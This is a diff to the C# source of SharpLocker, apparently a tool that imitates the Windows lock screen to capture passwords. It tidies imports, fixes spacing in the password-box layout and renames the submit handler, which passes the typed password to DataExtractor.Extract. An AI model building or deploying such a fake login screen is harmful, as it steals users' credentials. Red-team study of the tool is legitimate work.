@@ -1,19 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.Drawing.Drawing2D;
-using System.Net;
-using System.Runtime.InteropServices;
-using Microsoft.Win32;
 
 
 namespace SharpLocker
@@ -80,12 +73,12 @@ namespace SharpLocker
             show.Left = middleWidth + (tbwidth / 2) - 45;
 
             PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
-            PasswordTextBox.Size = new System.Drawing.Size(tbwidth-4, Convert.ToInt32(tbsize));
+            PasswordTextBox.Size = new System.Drawing.Size(tbwidth - 4, Convert.ToInt32(tbsize));
             PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;
 
-            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize*0.125));
+            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
             textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
-            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize*1.25));
+            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize * 1.25));
 
             power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
             power.Top = Screen.PrimaryScreen.Bounds.Height - 60;
@@ -192,7 +185,7 @@ namespace SharpLocker
             PasswordTextBox.UseSystemPasswordChar = true;
         }
 
-        private void button1_Click_1(object sender, EventArgs e)
+        private void SubmitButton_Click_1(object sender, EventArgs e)
         {
             DataExtractor.Extract(PasswordTextBox.Text);
 
